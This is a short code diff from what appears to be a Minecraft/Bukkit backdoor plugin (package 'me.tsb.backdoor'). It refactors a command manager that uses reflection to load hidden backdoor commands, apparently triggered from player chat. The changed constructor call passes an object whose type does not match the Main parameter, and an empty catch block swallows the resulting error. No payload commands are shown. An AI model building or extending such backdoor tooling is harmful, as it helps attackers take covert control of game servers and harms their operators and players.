@@ -2,6 +2,7 @@ package me.tsb.backdoor;
 
 import lombok.Getter;
 import lombok.SneakyThrows;
+import me.tsb.backdoor.commands.*;
 import me.tsb.plugin.Main;
 import org.bukkit.ChatColor;
 import org.bukkit.event.player.PlayerChatEvent;
@@ -30,18 +31,13 @@ public class CommandMan {
 
     @SneakyThrows
     public void init() {
-
         Reflections reflections = new Reflections("me.tsb.backdoor.commands");
 
         for (Class<? extends Command> aClass : reflections.getSubTypesOf(Command.class)) {
-
             try {
-
-                AddCommand(aClass.getConstructor(Main.class).newInstance(main));
-                AddCommand(aClass.getConstructor().newInstance());
+                AddCommand(aClass.getConstructor(Main.class).newInstance(this));
             } catch (Exception ignored) {
             }
-
         }
     }
 
